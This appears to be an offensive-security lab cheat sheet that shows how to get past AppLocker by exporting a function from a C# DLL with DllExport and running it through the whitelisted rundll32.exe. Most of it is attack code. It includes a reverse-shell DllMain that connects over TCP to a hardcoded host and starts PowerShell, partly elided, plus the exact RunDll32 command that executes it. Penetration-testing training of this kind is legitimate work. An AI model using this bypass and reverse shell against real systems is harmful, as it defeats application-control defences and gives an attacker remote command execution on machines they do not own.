# 16.07 AppLocker Bypass RunDll32 DllExport

> Export a native function from a C# DLL via `DllExport` NuGet — `rundll32.exe` (whitelisted under `%WINDIR%`) executes it.

## Overview

RunDll32.exe lives in %WINDIR%\System32 and is AppLocker-whitelisted. Use the DllExport NuGet package to export a method from a C# Class Library as a native DLL export. RunDll32 executes it.

## Steps

- Create Class Library (.NET Framework) project.
- Add DllExport NuGet package (from HTB package source in lab).
- Decorate method with [DllExport("DllMain")] — can be any name.
- Hardcode IP/Port; use SysWOW64 PS path for 32-bit, System32 for 64-bit.
- Run: `RunDll32.exe path\to.dll,DllMain`

## Commands

### RShell_D.cs — basic template (source)

```csharp
namespace RShell_D
{
    internal class Program
    {
        [DllExport("DllMain")]
        public static void DllMain()
        {
            // CODE EXECUTION
        }
    }
}
```

### RShell_D.cs — actual DllMain implementation

```csharp
[DllExport("DllMain")]
public static void DllMain()
{
    try
    {
        // Connect to <IP> on <Port>/TCP
        TcpClient client = new TcpClient();
        client.Connect("10.10.10.10", 1010);
        <SNIP>
        p.StartInfo.FileName = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe";

    }
}
```

### Execute via RunDll32

```powershell
C:\Windows\System32\RunDll32.exe C:\Tools\RShell_D\RShell_D\bin\Release\x86\RShell_D.dll,DllMain
```
